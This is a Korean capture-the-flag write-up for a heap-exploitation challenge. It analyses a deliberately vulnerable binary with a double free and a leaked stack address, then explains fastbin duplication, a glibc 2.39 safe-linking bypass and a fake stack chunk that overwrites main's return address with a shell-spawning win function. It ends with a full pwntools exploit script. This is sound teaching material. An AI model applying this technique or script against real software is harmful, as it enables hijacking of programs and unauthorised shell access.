# fastbin duplication (test2) — 스택 복귀 주소 덮기

fastbin duplication + safe linking 우회로 스택에 청크를 할당받아 main의 복귀 주소를 `win`으로 덮는 문제.

test 버전과 달리 `target[]` 전역/0xdeadbeef 체크가 없다. 대신 프로그램이 스택 버퍼 `name`의 주소를 직접 알려주고, 우리는 그 주소를 이용해 **스택 위에 fake chunk를 만들어 복귀 주소를 덮는다.**

## 보호 기법
```
RELRO:   Partial RELRO
Canary:  No canary
NX:      enabled
PIE:     No PIE (0x400000)      <- win 주소 고정
libc:    glibc 2.39             <- safe linking 적용
```
- No PIE라 `win`(`0x40127b`)은 고정 주소다.
- No canary + 복귀 주소를 덮을 수 있으면 바로 제어 흐름 탈취 가능.

## 바이너리 분석
```c
char* ptr[3];
void win() { execve("/bin/sh", 0, 0); }

int main() {
    char name[16];            // = rbp - 0x20
    int pos, idx, size;
    ...
    read(0, name, 16);                               // name에 16바이트 입력 가능
    printf("The name was written at memory %p.\n", name);  // name 주소 릭!
    while(1) {
        // 1: calloc(1,size) 후 read   (tcache 건너뜀!)
        // 2: free(ptr[idx])           (초기화 X -> double free 가능)
        // 3: printf("%s", ptr[idx])   (해제된 청크 fd 릭 가능)
        // 0: return 0;
    }
}
```

취약점 요약:
1. **`free` 후 포인터 초기화 안 함** → double free / UAF.
2. **`view`(case 3)** → 해제된 청크의 fd를 출력 → 힙 주소 릭.
3. 할당에 **`calloc` 사용** → `calloc`은 tcache를 건너뛰고 fastbin에서 **정확히 같은 크기**로만 꺼낸다. 따라서 이 문제는 tcache poisoning이 아니라 **fastbin duplication**으로 풀어야 한다.
4. **`name` 주소를 알려줌** → 스택에 fake chunk를 만들 좌표를 제공.

### 핵심 좌표 (디스어셈블로 확인)
- `read`가 `lea -0x20(%rbp)`로 `name`을 잡음 → `name = rbp - 0x20`
- x86-64에서 복귀 주소는 `rbp + 8`에 저장됨
- 따라서 **복귀 주소 = name + 0x28**

```
  높은 주소 ▲
  rbp+0x08 : 복귀 주소(return)  = name+0x28   ◀ 덮을 곳
  rbp+0x00 : saved rbp         = name+0x20
  ...
  rbp-0x20 : name[0]           = name+0x00
  낮은 주소 ▼
```

## 원리

### 1. fastbin duplication 트리거
`calloc`은 tcache를 안 쓰므로, 먼저 tcache[0x50]을 7개 꽉 채워 두면 이후 free는 fastbin으로 들어간다.
- `alloc(0,0x40); free(0)` × 7 → tcache[0x50] 가득 참
- `alloc(0,0x40)`=A, `alloc(1,0x40)`=B (top에서 새로 생성)
- `free(0); free(1); free(0)` → fastbin double free. 번갈아 해제했으므로 "직전에 해제한 청크를 또 해제"하는 체크를 우회.

결과 fastbin[0x50]: `head → A → B → A` (A가 B를, B가 A를 가리킴)

### 2. safe linking 우회 (힙 릭)
glibc 2.32+는 fd를 힙 주소 기반으로 인코딩한다.
```c
#define PROTECT_PTR(pos, ptr) ((typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
#define REVEAL_PTR(ptr)       PROTECT_PTR(&ptr, ptr)
```
`view(1)` → B.fd = `PROTECT_PTR(mem_B, A)` 가 출력됨. 이를 쉬프트 XOR로 디코딩하면 A의 주소를 복원:
```python
addr = leak ^ (leak>>12) ^ (leak>>24) ^ (leak>>36)   # = A 청크 주소
```
(상위 니블부터 아래로 XOR을 누적하면 `pos>>12` XOR이 풀린다.)

### 3. fake chunk 헤더 (왜 name+8 = size 인가)
fastbin은 재할당 시 **청크 크기를 검증**한다 (`malloc(): memory corruption (fast)`). 힙 청크 포맷은 고정:
```
청크시작 +0x00 : prev_size
청크시작 +0x08 : size        ← (돌려받는 주소 - 0x8)
청크시작 +0x10 : user data   ← calloc이 돌려주는 주소
```
fake chunk 시작을 **`name`**으로 잡으면:
- size 칸 = `name + 0x08`  ← 처음 16바이트 `read`로 **우리가 채울 수 있는 유일한 칸**
- 돌려받는 주소 = `name + 0x10`

그래서 입력 첫 줄에서 `name` = `b'A'*8 + p64(0x51)`을 넣어 size 칸에 `0x51`을 심는다.
`fastbin_index(0x50) == fastbin_index(0x50)` 이 성립해 검증을 통과한다.
(fake chunk를 `name-0x10`에 두면 size 칸이 `name-0x8`이 되어 제어 불가 → 그래서 시작을 `name`으로 잡음.)

### 4. fd 조작으로 free list에 스택 주소 삽입
A를 할당받아(= A.fd 자리에 write) 다음 재할당 대상을 `name`으로 지정한다. safe linking 적용:
```python
target = name_addr ^ (addr >> 12)   # REVEAL_PTR 하면 name_addr 이 나오도록 인코딩
```
> 주의: 이 `target`은 **glibc가 fd로 해석하는 값**이라 인코딩한다.
> 반면 뒤에서 쓰는 `win`은 **그냥 메모리에 적는 데이터**라 인코딩하지 않는다. (핵심 포인트)

### 5. 스택 할당 → 복귀 주소 덮기
fake chunk는 free list의 4번째다. 앞의 B, A를 할당으로 빼낸 뒤 4번째 할당에서 `name+0x10`을 돌려받는다.
그 지점에서 복귀 주소(`name+0x28`)까지 거리 = `0x28 - 0x10 = 0x18`.
```python
alloc(0, 0x40, b'A'*0x18 + p64(win))   # +0x18 뒤 = 복귀 주소에 win 착지
```
마지막에 `0` 입력 → `return 0` → 복귀 주소의 `win` 실행 → `execve("/bin/sh")`.

> calloc이 할당 직후 `name+0x10 ~ +0x50`을 memset으로 0으로 밀지만, size 검증은 그 **전에** 끝나고(`name+8`은 user data 밖이라 보존), 복귀 주소는 어차피 직후 read로 덮으므로 문제없다.

## 익스플로잇
```python
from pwn import *
p = process('./fastbin_dup')
e = ELF('./fastbin_dup')
win = e.symbols['win']

# name[8:16] = fake fastbin size 0x51 (size 검증 통과용), 정확히 16바이트
p.sendafter(b'name? ', b'A'*8 + p64(0x51))
p.recvuntil(b'memory ')
name_addr = int(p.recvn(14), 16)

def alloc(idx,size,content):
    p.sendlineafter(b'>> ', b'1'); p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode()); p.sendlineafter(b': ', content)
def free(idx):
    p.sendlineafter(b'>> ', b'2'); p.sendlineafter(b': ', str(idx).encode())
def view(idx):
    p.sendlineafter(b'>> ', b'3'); p.sendlineafter(b': ', str(idx).encode())

# 1) tcache[0x50] 7개 채우기
for _ in range(7):
    alloc(0,0x40,b'A'); free(0)

# 2) fastbin double free:  head -> A -> B -> A
alloc(0,0x40,b'A'); alloc(1,0x40,b'A')
free(0); free(1); free(0)

# 3) 힙 릭 + safe linking 디코딩
view(1)
leak = p.recvline()[:-1]
leak = u64(leak + b'\x00'*(8-len(leak)))
addr = leak ^ (leak>>12) ^ (leak>>24) ^ (leak>>36)   # A 청크 주소

# 4) A.fd 를 name(=fake chunk)으로 인코딩해서 삽입
target = name_addr ^ (addr>>12)
alloc(0,0x40,p64(target))   # pop A, fd -> fake
alloc(1,0x40,b'B')          # pop B
alloc(2,0x40,b'C')          # pop A
# 5) 4번째 할당 = fake chunk @ name_addr. name+0x28(복귀주소)에 win (win은 평문!)
alloc(0,0x40,b'A'*0x18 + p64(win))

# 6) main return -> win
p.sendlineafter(b'>> ', b'0')
p.interactive()
```

## 요약
1. `calloc`이라 tcache 공격 불가 → tcache 7개 채우고 **fastbin**으로 넘긴다.
2. 두 청크를 번갈아 free → **fastbin double free** (head → A → B → A).
3. `view`로 해제 청크 fd 릭 → `leak ^ leak>>12 ^ leak>>24 ^ leak>>36`로 힙 주소 복원.
4. fake chunk 시작을 **`name`**으로 잡아 size 칸(`name+8`)에 `0x51`을 미리 심는다.
5. A.fd에 `name_addr ^ (addr>>12)`(**인코딩**)를 써서 free list에 스택 주소 삽입.
6. 할당 3번으로 B·A를 빼내고 4번째에 `name+0x10`을 받음 → `0x18` 패딩 + `win`(**평문**)으로 **복귀 주소(name+0x28)** 덮기.
7. `0` 입력 → return → `win` → shell.

### 흔한 실수
- `win`을 safe linking으로 인코딩함 → ✗. fd에 심는 `target`만 인코딩, write 데이터(`win`)는 평문.
- poisoning 단계 size를 `0x10`으로 함 → ✗. calloc은 정확히 같은 크기(`0x40`)에서만 꺼내므로 fastbin[0x50]을 안 건드린다.
- fake chunk를 `name-0x10`에 둠 → ✗. size 칸이 제어 불가한 `name-0x8`이 되어 검증 실패.
